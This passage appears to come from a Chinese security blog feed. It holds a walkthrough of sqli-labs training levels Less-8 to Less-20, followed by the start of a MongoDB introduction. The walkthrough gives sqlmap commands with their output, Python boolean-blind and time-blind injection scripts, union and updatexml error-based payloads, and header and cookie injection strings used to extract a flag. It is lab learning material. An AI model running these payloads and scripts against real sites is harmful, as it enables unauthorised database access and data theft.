class="line">[*] performance_schema</span><br><span class="line">[*] <span class="built_in">test</span></span><br><span class="line"></span><br><span class="line">sqlmap --technique=B -u <span class="string">&#x27;http://ac49ba05-c3a7-4856-b14a-ac645078289d.node5.buuoj.cn/Less-8/?id=1&#x27;</span> -D ctftraining --tables</span><br><span class="line"></span><br><span class="line">[00:50:30] [INFO] retrieved: 3</span><br><span class="line">[00:50:30] [INFO] retrieved: flag</span><br><span class="line">[00:50:32] [INFO] retrieved: news</span><br><span class="line">[00:50:34] [INFO] retrieved: <span class="built_in">users</span></span><br><span class="line">Database: ctftraining</span><br><span class="line">[3 tables]</span><br><span class="line">+-------+</span><br><span class="line">| flag  |</span><br><span class="line">| news  |</span><br><span class="line">| <span class="built_in">users</span> |</span><br><span class="line">+-------+</span><br><span class="line"></span><br><span class="line">sqlmap --technique=B -u <span class="string">&#x27;http://ac49ba05-c3a7-4856-b14a-ac645078289d.node5.buuoj.cn/Less-8/?id=1&#x27;</span> -D ctftraining -T flag --columns</span><br><span class="line"></span><br><span class="line">[00:52:08] [INFO] retrieved: 1</span><br><span class="line">[00:52:08] [INFO] retrieved: flag</span><br><span class="line">[00:52:10] [INFO] retrieved: char(128)</span><br><span class="line">Database: ctftraining</span><br><span class="line">Table: flag</span><br><span class="line">[1 column]</span><br><span class="line">+--------+-----------+</span><br><span class="line">| Column | Type      |</span><br><span class="line">+--------+-----------+</span><br><span class="line">| flag   | char(128) |</span><br><span class="line">+--------+-----------+</span><br><span class="line"></span><br><span class="line">sqlmap --technique=B -u <span class="string">&#x27;http://ac49ba05-c3a7-4856-b14a-ac645078289d.node5.buuoj.cn/Less-8/?id=1&#x27;</span> -D ctftraining -T flag -C flag --dump</span><br><span class="line"></span><br><span class="line">[00:58:14] [INFO] retrieved: 1</span><br><span class="line">[00:58:15] [INFO] retrieved: flag&#123;fff4e3e8-56b7-4dba-b3e0-6094092c0666&#125;</span><br><span class="line">Database: ctftraining</span><br><span class="line">Table: flag</span><br><span class="line">[1 entry]</span><br><span class="line">+--------------------------------------------+</span><br><span class="line">| flag                                       |</span><br><span class="line">+--------------------------------------------+</span><br><span class="line">| flag&#123;fff4e3e8-56b7-4dba-b3e0-6094092c0666&#125; |</span><br><span class="line">+--------------------------------------------+</span><br><span class="line"></span><br><span class="line">tips:这里获取的时候出错了一次,下次dump时会直接返回缓存文件中错误的内容而不是注入,我们可以使用-flush-session参数来刷新缓存</span><br><span class="line">sqlmap --technique=B -u <span class="string">&#x27;http://ac49ba05-c3a7-4856-b14a-ac645078289d.node5.buuoj.cn/Less-8/?id=1&#x27;</span> -D ctftraining -T flag -C flag --dump -flush-session</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h1><p>探测到单引号闭合,且这次只要有输入都会回显You are in………..</p><p>但是sleep(5)会被执行,所以为时间盲注</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">host = <span class="string">&#x27;http://ac49ba05-c3a7-4856-b14a-ac645078289d.node5.buuoj.cn/Less-9/&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">sql = <span class="string">&quot;select flag from ctftraining.flag&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    <span class="built_in">min</span> = <span class="number">32</span></span><br><span class="line">    <span class="built_in">max</span> = <span class="number">127</span></span><br><span class="line">    mid = (<span class="built_in">min</span> + <span class="built_in">max</span>) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">min</span> &lt; <span class="built_in">max</span>):</span><br><span class="line">        payload = host + <span class="string">&quot;?id=1&#x27; and if(ascii(substr(&quot;</span>+ <span class="string">&#x27;(&#x27;</span> + sql + <span class="string">&#x27;)&#x27;</span> +<span class="string">&quot;,&#123;&#125;,1))&gt;&#123;&#125;,sleep(1),1)--+&quot;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">        time1 = time.time()</span><br><span class="line">        res = requests.get(url=payload)</span><br><span class="line">        <span class="keyword">if</span> time.time() - time1 &gt; <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">min</span> = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">max</span> = mid</span><br><span class="line">        mid = (<span class="built_in">min</span> + <span class="built_in">max</span>) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> mid &lt;=<span class="number">32</span> <span class="keyword">or</span> mid &gt;= <span class="number">127</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    flag = flag + <span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240219141744631.png" alt="image-20240219141744631"></p><p>当然也可以使用sqlmap</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap --technique=T -u &#x27;http://ac49ba05-c3a7-4856-b14a-ac645078289d.node5.buuoj.cn/Less-9/?id=1&#x27; -D ctftraining -T flag -C flag --dump -flush-session</span><br></pre></td></tr></table></figure><p>同样可以获取flag</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240219142725988.png" alt="image-20240219142725988"></p><h1 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h1><p>与Less-9不同之处在于此题使用双引号闭合</p><p>将Less-9的exp中单引号闭合改为双引号即可</p><h1 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h1><p>这里其实是可以union注入的</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd=-1&amp;Submit=submit&amp;uname=-1&#x27; union select flag,2 from ctftraining.flag--+</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240219144027646.png" alt="image-20240219144027646"></p><p>但题目给出的tag是报错注入,还是尝试一下报错注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Submit=submit&amp;passwd=-1&amp;uname=-1&#x27; and updatexml(1,concat(0x7e,(select substr(flag,1,30) from ctftraining.flag),0x7e),1)--+</span><br><span class="line"></span><br><span class="line">Submit=submit&amp;passwd=-1&amp;uname=-1&#x27; and updatexml(1,concat(0x7e,(select substr(flag,30,100) from ctftraining.flag),0x7e),1)--+</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240219144902177.png" alt="image-20240219144902177"></p><p>缺点是报错注入只显示部分字符串,需要substr来截取</p><h1 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h1><p>使用<code>&quot;)</code>闭合,其他与Less-11相同</p><h1 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h1><p>使用<code>&#39;)</code>闭合,其他与Less-11相同</p><h1 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h1><p>使用<code>&quot;</code>闭合也可以直接报错注入</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240219170929047.png" alt="image-20240219170929047"></p><p>不知道是不是预期, 题目tag写的并不是双引号闭合</p><h1 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h1><p>post登录,万能密码<code>&#39; or 1=1--+</code>测出注入点</p><p>登录成功返回flag.jpg(提示登录成功)</p><p>登录失败返回slap.jpg(提示登录失败)</p><p>这里编写exp的时候出现了一个小插曲</p><p>我在用使用requests模块发包时,同样的数据,在hackbar中回显flag.jpg而用python发包却回显slap.jpg</p><p>百般疑惑之后,用burp抓包并使用comparer模块进行对比</p><p>左为python发包,右图为hackbar发包</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240219182436378.png" alt="image-20240219182436378"></p><p>非常的amazing,这里python将<code>+</code>又进行了一次urlencode变成了%2B,但是<code>+</code>本身就是空格经过一次urlencode的结果,我们是想传入空格而不是加号这个字符</p><p>最后的exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment">#代理到bp</span></span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">&quot;http&quot;</span>: <span class="string">&quot;http://127.0.0.1:8080&quot;</span>,</span><br><span class="line">    <span class="string">&quot;https&quot;</span>: <span class="string">&quot;http://127.0.0.1:8080&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">key_of_true = <span class="string">&#x27;flag.jpg&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">url = <span class="string">&quot;http://21b39a7b-a1e6-48ac-8fc8-88c3ba78e2bf.node5.buuoj.cn/Less-15/&quot;</span></span><br><span class="line">sql = <span class="string">&quot;select flag from ctftraining.flag&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;passwd&#x27;</span>: <span class="string">&#x27;admin&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Submit&#x27;</span>: <span class="string">&#x27;submit&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;uname&#x27;</span>: <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">payload = <span class="string">&quot;a&#x27; or (ascii(substr(&quot;</span> + <span class="string">&#x27;(&#x27;</span> + sql + <span class="string">&#x27;)&#x27;</span> + <span class="string">&quot;,&#123;&#125;,1))&gt;&#123;&#125;)-- &quot;</span>  <span class="comment">#这里注释符号必须是`-- `而不是`--+`</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">1000</span>):</span><br><span class="line">    <span class="built_in">min</span> = <span class="number">32</span></span><br><span class="line">    <span class="built_in">max</span> = <span class="number">128</span></span><br><span class="line">    mid = (<span class="built_in">min</span> + <span class="built_in">max</span>)//<span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">min</span> &lt; <span class="built_in">max</span>):</span><br><span class="line">        data[<span class="string">&#x27;uname&#x27;</span>] = payload.<span class="built_in">format</span>(i, mid)</span><br><span class="line">        res = requests.post(url=url, data=data)</span><br><span class="line">        time.sleep(<span class="number">0.05</span>)</span><br><span class="line">        <span class="keyword">if</span> key_of_true <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="built_in">min</span> = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">max</span> = mid</span><br><span class="line">        mid = (<span class="built_in">min</span> + <span class="built_in">max</span>)//<span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> mid &lt;= <span class="number">32</span> <span class="keyword">or</span> mid &gt;= <span class="number">127</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    flag = flag+<span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h1 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h1><p><code>&quot;)</code>闭合</p><p>将less-15的exp中的payload变量改为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&quot;) or (ascii(substr(&#x27;</span> + <span class="string">&#x27;(&#x27;</span> + sql + <span class="string">&#x27;)&#x27;</span> + <span class="string">&#x27;,&#123;&#125;,1))&gt;&#123;&#125;)-- &#x27;</span></span><br></pre></td></tr></table></figure><p>即可</p><h1 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h1><p>和之前的查询语句不同,此关为update语句, 所以联合查询什么的就用不了</p><p>后端sql语句大约为:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span> users <span class="keyword">set</span> passwd <span class="operator">=</span> <span class="string">&#x27;$passwd&#x27;</span> <span class="keyword">where</span> username <span class="operator">=</span> <span class="string">&#x27;$username&#x27;</span></span><br></pre></td></tr></table></figure><p>需要注意的是,这里的注入点在passwd而不是之前的uname</p><p>因为这里uname似乎加了waf</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd=admin&#x27; and updatexml(1,concat(0x7e,(select substr(flag,1,30) from ctftraining.flag),0x7e),1)#&amp;Submit=Submit&amp;uname=admin</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240219191011975.png" alt="image-20240219191011975"></p><p>查看一下源码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$value</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// truncation (see comments)</span></span><br><span class="line"><span class="variable">$value</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$value</span>,<span class="number">0</span>,<span class="number">15</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">get_magic_quotes_gpc</span>())</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$value</span> = <span class="title function_ invoke__">stripslashes</span>(<span class="variable">$value</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Quote if not a number</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">ctype_digit</span>(<span class="variable">$value</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$value</span> = <span class="string">&quot;&#x27;&quot;</span> . <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$value</span>) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$value</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$value</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="comment">//making sure uname is not injectable</span></span><br><span class="line"><span class="variable">$uname</span>=<span class="title function_ invoke__">check_input</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]);  </span><br></pre></td></tr></table></figure><p>确实做了waf</p><h1 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h1><p>此题在UA处存在sql注入</p><p>后端执行的sql语句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$insert</span>=<span class="string">&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;<span class="subst">$uagent</span>&#x27;, &#x27;<span class="subst">$IP</span>&#x27;, <span class="subst">$uname</span>)&quot;</span>;</span><br></pre></td></tr></table></figure><p>这里直接获取headers中的User-Agent并插入到数据库中</p><p>且输入单引号后会回显报错信息</p><p>可对ua进行报错注入</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: 1&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1) and &#x27;</span><br></pre></td></tr></table></figure><p>拼接为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$insert</span>=<span class="string">&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;1&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1) and &#x27;&#x27;, &#x27;<span class="subst">$IP</span>&#x27;, <span class="subst">$uname</span>)&quot;</span>;</span><br></pre></td></tr></table></figure><p>获取flag</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240219194146867.png" alt="image-20240219194146867"></p><h1 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h1><p>相同的配方,只不过这次注入点在Referer</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240219194408905.png" alt="image-20240219194408905"></p><h1 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h1><p>题目给的tag是Cookie注入,但是这里并没有set-cookie</p><p>查看了一下源码,比较关键的几句:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$cookee</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;uname&#x27;</span>];</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">    </span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="subst">$cookee</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$result</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Issue with your mysql: &#x27;</span> . <span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$row</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;pink&quot; font size=&quot;5&quot;&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your Login name:&#x27;</span> . <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;grey&quot; font size=&quot;5&quot;&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your Password:&#x27;</span> . <span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&lt;/b&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your ID:&#x27;</span> . <span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>所以我们需要自己设置一个名为uname的cookie</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240219201031236.png" alt="image-20240219201031236"></p><p>注意此时POST中不能提交submit数据,源码中的查询语句只有在表单中没设置submit时才会触发</p>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MongoDB初体验</title>
      <link href="/2024/02/01/MongoDB%E5%88%9D%E4%BD%93%E9%AA%8C/"/>
      <url>/2024/02/01/MongoDB%E5%88%9D%E4%BD%93%E9%AA%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="安装MongoDB"><a href="#安装MongoDB" class="headerlink" title="安装MongoDB"></a>安装MongoDB</h1><p>MongoDB server:<a href="https://www.mongodb.com/try/download/community">https://www.mongodb.com/try/download/community</a></p><p>客户端mongo shell:<a href="https://www.mongodb.com/try/download/shell">https://www.mongodb.com/try/download/shell</a></p><p>安装环境: Ubuntu 22.04</p><h2 id="mongo-server"><a href="#mongo-server" class="headerlink" title="mongo server"></a>mongo server</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg -i mongodb-org-server_7.0.5_amd64.deb</span><br></pre></td></tr></table></figure><p>启动:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start mongod.service</span><br></pre></td></tr></table></figure><h2 id="mongo-shell"><a href="#mongo-shell" class="headerlink" title="mongo shell"></a>mongo shell</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf mongosh-x.x.x-linux-x64.tgz</span><br></pre></td></tr></table></figure><p>在<code>mongosh-x.x.x-linux-x64/bin</code>目录下操作</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="built_in">cp</span> mongosh /usr/local/bin/</span><br><span class="line">sudo <span class="built_in">cp</span> mongosh_crypt_v1.so /usr/local/lib/</span><br></pre></td></tr></table></figure><h2 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mongosh --host 127.0.0.1 --port 27017</span><br></pre></td></tr></table></figure><h1 id="与传统的mysql类比"><a href="#与传统的mysql类比" class="headerlink" title="与传统的mysql类比"></a>与传统的mysql类比</h1><table><thead><tr><th>SQL 概念</th><th>MongoDB 概念</th><th>说明</th></tr></thead><tbody><tr><td>database</td><td>database</td><td>数据库</td></tr><tr><td>table</td><td>collection</td><td>数据库表&#x2F;集合</td></tr><tr><td>row</td><td>document</td><td>数据记录行&#x2F;文档</td></tr><tr><td>column</td><td>field</td><td>数据字段&#x2F;域</td></tr><tr><td>index</td><td>index</td><td>索引</td></tr><tr><td>table joins</td><td></td><td>表连接，MongoDB 不支持</td></tr><tr><td>primary key</td><td>primary key</td><td>主键，MongoDB 自动将 <code>_id</code> 字段设置为主键</td></tr></tbody></table><p>MongoDB 将数据存储为一个文档，数据结构由键值（key&#x3D;&gt;value）对组成。MongoDB 文档类似于 JSON 对象。字段值可以包含其他文档，数组及文档数组。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;_id&quot; : ObjectId(&quot;60fa854cf8aaaf4f21049148&quot;),</span><br><span class="line">    &quot;name&quot; : &quot;whoami&quot;,</span><br><span class="line">    &quot;description&quot; : &quot;the admin user&quot;,</span><br><span class="line">    &quot;age&quot; : 19,</span><br><span class="line">    &quot;status&quot; : &quot;A&quot;,</span><br><span class="line">    &quot;groups&quot; : [</span><br><span class="line">        &quot;admins&quot;,</span><br><span class="line">        &quot;users&quot;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h1><p>我们使用use users来转到users数据库,如果没有, 将会__自动创建一个__,即使用use users来创建一个数据库</p><p>查看所有数据库</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> dbs</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240202001642138.png" alt="image-20240202001642138"></p><p>并没有出现users,因为需要先插入数据</p><h3 id="添加一个集合"><a href="#添加一个集合" class="headerlink" title="添加一个集合"></a>添加一个集合</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.createCollection(&quot;all_users&quot;)</span><br></pre></td></tr></table></figure><h3 id="向集合中插入一个文档"><a href="#向集合中插入一个文档" class="headerlink" title="向集合中插入一个文档"></a>向集合中插入一个文档</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">&gt;</span> db.all_users.insert(&#123;name: <span class="string">&#x27;whoami&#x27;</span>, </span><br><span class="line">    description: <span class="string">&#x27;the admin user&#x27;</span>,</span><br><span class="line">    age: <span class="number">19</span>,</span><br><span class="line">    status: <span class="string">&#x27;A&#x27;</span>,</span><br><span class="line">    <span class="keyword">groups</span>: [<span class="string">&#x27;admins&#x27;</span>, <span class="string">&#x27;users&#x27;</span>]</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="更新文档内容"><a href="#更新文档内容" class="headerlink" title="更新文档内容"></a>更新文档内容</h3><h4 id="update-方法"><a href="#update-方法" class="headerlink" title="update()方法"></a>update()方法</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">&gt;</span> db.all_users.update(&#123; <span class="string">&#x27;age&#x27;</span>: <span class="number">19</span> &#125;, &#123; $<span class="keyword">set</span>: &#123; <span class="string">&#x27;age&#x27;</span>: <span class="number">20</span> &#125; &#125;)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240202002705382.png" alt="image-20240202002705382"></p><p>此时文档内容已经更新了</p><h4 id="save-方法"><a href="#save-方法" class="headerlink" title="save()方法"></a>save()方法</h4><p>save() 方法通过传入的文档来替换已有文档，<code>_id</code> 主键存在就更新，不存在就插入.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">&gt;</span> db.all_users.save(&#123;</span><br><span class="line">    &quot;_id&quot; : 